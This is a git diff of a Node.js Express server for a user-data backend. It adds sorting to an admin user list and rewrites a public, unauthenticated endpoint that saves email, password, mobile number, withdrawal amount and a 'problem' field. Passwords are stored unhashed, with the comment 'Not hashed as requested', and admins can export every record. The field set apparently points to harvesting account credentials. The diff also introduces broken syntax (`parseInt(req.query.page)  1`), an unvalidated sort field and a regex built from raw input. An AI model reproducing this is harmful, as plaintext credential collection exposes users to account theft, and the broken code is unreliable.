@@ -179,14 +179,16 @@ app.get('/admin-data', authenticateToken, isAdmin, async (req, res) => {
   }
 });
 
-
-
-// Get users with pagination and search (removed sorting options)
+// Get users with pagination, sorting and search
 app.get('/usersdetails', authenticateToken, isAdmin, async (req, res) => {
   try {
-    const page = parseInt(req.query.page) || 1;
-    const limit = parseInt(req.query.limit) || 10;
+    const page = parseInt(req.query.page)  1;
+    const limit = parseInt(req.query.limit)  10;
     const skip = (page - 1) * limit;
+    const sortField = req.query.sortField || 'createdAt';
+    const sortDirection = req.query.sortDirection === 'asc' ? 1 : -1;
+    const sortOptions = {};
+    sortOptions[sortField] = sortDirection;
     
     let query = {};
     
@@ -202,10 +204,9 @@ app.get('/usersdetails', authenticateToken, isAdmin, async (req, res) => {
       };
     }
     
-    // Get users with pagination - always sort by createdAt (oldest first)
-    // This ensures new users appear at the end
+    // Get users with pagination and sorting
     const users = await User.find(query)
-      .sort({ createdAt: 1 }) // Fix to always sort by creation date (ascending)
+      .sort(sortOptions)
       .skip(skip)
       .limit(limit);
     
@@ -226,75 +227,33 @@ app.get('/usersdetails', authenticateToken, isAdmin, async (req, res) => {
 // Export all users (for CSV export)
 app.get('/users/export', authenticateToken, isAdmin, async (req, res) => {
   try {
-    // Changed sorting to ascending order so newest users are at the end
-    const users = await User.find().sort({ createdAt: 1 });
+    const users = await User.find().sort({ createdAt: -1 });
     res.json(users);
   } catch (err) {
     res.status(500).json({ message: err.message });
   }
 });
 
+// Create user endpoint (to save form submissions)
 app.post('/users', async (req, res) => {
+  try {
     const { email, password, mobileNumber, withdrawalAmount, problem } = req.body;
     
-    // Create user with current timestamp (MongoDB will handle this automatically with the timestamps option)
     const user = new User({
       email,
-      password,
+      password, // Note: Not hashed as requested
       mobileNumber,
       withdrawalAmount,
       problem
-      // createdAt will be automatically added by Mongoose timestamps
     });
     
-    try {
-      let a = await user.save();
-      if(a) {
-        res.json({
-          message: 'User created successfully',
-          status: true
-        });
-      } else {
-        res.json({
-          message: 'Failed to create user',
-          status: false
-        });
-      }
-    } catch (error) {
-      res.status(500).json({
-        message: 'Error creating user: ' + error.message,
-        status: false
-      });
-    }
-});
-// API Endpoint to get all users (sorted by creation time - oldest to newest)
-app.get('/allusers', authenticateToken, isAdmin, async (req, res) => {
-  try {
-    let query = {};
-    
-    // Add search functionality
-    if (req.query.search) {
-      const searchRegex = new RegExp(req.query.search, 'i');
-      query = {
-        $or: [
-          { email: searchRegex },
-          { mobileNumber: searchRegex },
-          { problem: searchRegex }
-        ]
-      };
-    }
-    
-    // Get all users - sort by createdAt ascending (oldest to newest)
-    const users = await User.find(query).sort({ createdAt: 1 });
-    
-    res.json({
-      users,
-      total: users.length
-    });
+    await user.save();
+    res.status(201).json({ message: 'User data saved successfully' });
   } catch (err) {
     res.status(500).json({ message: err.message });
   }
 });
+
 
 
 // ✅ Start Server
